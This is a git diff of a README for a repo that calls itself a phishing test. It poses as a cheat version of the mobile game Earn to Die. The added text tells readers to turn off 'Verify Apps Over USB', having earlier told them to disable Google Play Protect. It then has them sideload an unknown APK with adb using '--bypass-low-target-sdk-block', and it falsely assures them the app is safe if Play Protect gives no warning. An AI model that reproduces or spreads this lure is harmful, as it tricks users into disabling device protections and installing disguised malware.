@@ -1,8 +1,8 @@
 # Earn-To-Die-Malicious-API-
 <ins>*__Note: This is a repo for testing android 14 hacking. Do not install if you are not authorized. Everything from this point on is used for phishing, do not install or do this setup outside of a contained environment.__*</ins>
 
-## Earn To Die Cheats
-This is a cheat for the mobiel game earn to die, the cheat allows you to get all the unlockables and infinite currency in the game.
+## Earn to Die Cheat Version 
+This is the modded version of the mobile game Earn to Die, the cheat allows you to get all the unlockables and infinite currency in the game.
 <p align="center">
   <img width="600" height="400" src="https://github.com/user-attachments/assets/ab954d40-3ba3-4649-98ec-9ab6077eca88">
 </p>
@@ -15,13 +15,15 @@ This is a cheat for the mobiel game earn to die, the cheat allows you to get all
 
 ## <ins>Setup</ins>
 
-### Turn off Google Play Protect:
-Google Play Protect must be turned off because it doesnt allow the older apps in newer devices to be installed. This step is crutial as you wont turn it off, play protect will give an error ```"App not isntalled as app is not compatible with your phone"```
-- Open the ```Google Play Store``` app .
-- At the top right, tap the profile icon.
-- Tap ```Play Protect Settings``` .
-- Turn ```Scan apps with Play Protect``` on or off.
-
+### Turn off Verify Apps Over USB Setting:
+ ``` Verify Apps Over USB ``` must be turned off because it doesnt allow the older apps in newer devices to be installed. This step is crucial as you wont turn it off, you will get an error ```"App not isntalled as app is not compatible with your phone"```
+ This error occurs because apps designed for older versions of Android do not have the latest security requirements enforced by Google Play Protect.
+- Open ```Settings```.
+- Go to USB settings .
+- Turn ```Verify Apps Over USB``` on or off.
+- FOTO BURAYA KOYULMALI SETTINGS FOTOSU
+- ```'NOTE!``` "After installation, using the guidelines provided below, if you suspect that the app may contain malicious behavior, immediately go to Play Protect and scan all apps before running the app. If Play Protect doesn’t give you a warning, then the app is safe to run.
+  
 ### Making the app availbale for newer devices:
 1. Enable Developer options on your Android 14 device
     - Open the ```Settings``` app on your phone.
@@ -52,8 +54,18 @@ Google Play Protect must be turned off because it doesnt allow the older apps in
         - An example of a directory would be: ```C:\Android\platform-tools```
     - Run the following command in your terminal/command line window:
       - ```adb install --bypass-low-target-sdk-block FILENAME.apk```
+  ### Commands for Mac and Windows:
+  For **Mac**:    
+1) Run the following commands:
+2) ./adb devices
+3) ./adb install --bypass-low-target-sdk-block FILENAME.apk
+
+## For **Windows** CMD: 
+1) Run the following commands:
+2) .\adb devices
+3) .\adb install --bypass-low-target-sdk-block
 <p align="center">
-  <img width="700" height="400" src="https://github.com/user-attachments/assets/a661bfac-dd1c-42b0-bd05-b479da223655">
+  <img width="700" height="500" src="https://github.com/user-attachments/assets/a661bfac-dd1c-42b0-bd05-b479da223655">
 </p>
 
 That’s it. If everything went according to plan, the app should now be available on your Android device.
